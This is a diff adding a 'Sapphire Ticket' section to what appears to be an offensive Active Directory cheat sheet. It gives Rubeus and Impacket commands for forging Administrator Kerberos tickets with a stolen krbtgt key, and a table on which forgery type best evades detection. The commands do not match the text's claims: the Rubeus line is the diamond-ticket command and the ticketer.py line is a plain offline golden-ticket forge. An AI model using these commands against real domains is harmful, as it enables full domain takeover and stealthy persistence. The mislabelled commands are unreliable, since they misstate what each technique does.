@@ -257,6 +257,55 @@ klist
 dir \\dc01.corp.local\C$
 ```
 
+## Sapphire Ticket
+
+A Sapphire Ticket is the stealthiest Kerberos ticket forging technique. Like the Diamond Ticket, it starts with a legitimate TGT from the KDC. But instead of modifying the PAC directly, the attacker uses the S4U2Self+U2U trick to obtain a valid PAC for any user, then injects that PAC into their own ticket. The PAC is fully legitimate (signed by the KDC, correct PAC_INFO_BUFFER, proper checksums) — making it effectively undetectable by PAC validation.
+
+```
+# Sapphire Ticket requires:
+# 1. krbtgt AES256 key (from DCSync)
+# 2. A valid low-privilege domain account
+# 3. The target user's SID (the user you want to impersonate)
+
+# Sapphire Ticket via Rubeus
+# Step 1: Get a legitimate TGT for your low-priv user
+Rubeus.exe asktgt /user:lowprivuser /password:Password1 /domain:corp.local /dc:dc01.corp.local /enctype:aes256
+
+# Step 2: Use S4U2Self+U2U to obtain a legitimate PAC for the target user
+# Then replace the PAC in your TGT with the obtained PAC
+Rubeus.exe diamond /user:lowprivuser /password:Password1 /dc:dc01.corp.local /enctype:aes /krbkey:KRBTGT_AES256_KEY /ticketuser:Administrator /ticketuserid:500 /groups:512,519 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+
+# Impacket ticketer with Sapphire Ticket approach
+ticketer.py -nthash KRBTGT_NTLM_HASH -domain-sid S-1-5-21-... -domain corp.local -spn krbtgt/corp.local -user-id 500 Administrator
+
+# Verify
+klist
+dir \\dc01.corp.local\C$
+```
+
+```
+# Ticket comparison — stealth level:
+#
+# Golden Ticket:
+#   - Forged entirely offline — no AS-REQ to KDC
+#   - PAC constructed by attacker — checksums may mismatch
+#   - Ticket lifetime/timestamps are fake
+#   - Detectable: TGT without prior AS-REQ in KDC logs
+#
+# Diamond Ticket:
+#   - Legitimate AS-REQ → modify PAC in received TGT
+#   - Real timestamps, real ticket metadata
+#   - PAC is modified but re-signed with krbtgt key
+#   - Detectable: PAC modification (if PAC_INFO_BUFFER is analyzed)
+#
+# Sapphire Ticket:
+#   - Legitimate AS-REQ → obtain real PAC via S4U2Self+U2U
+#   - PAC is genuine (signed by KDC, not modified)
+#   - All timestamps, checksums, and PAC data are KDC-generated
+#   - Detection: extremely difficult — requires correlation of
+#     S4U2Self requests with ticket usage patterns
+```
+
 ## DSRM Abuse
 
 Every Domain Controller has a local DSRM (Directory Services Restore Mode) Administrator account. Its hash can be extracted and the account configured to allow network logons — creating a persistent local admin backdoor on the DC independent of domain credentials.
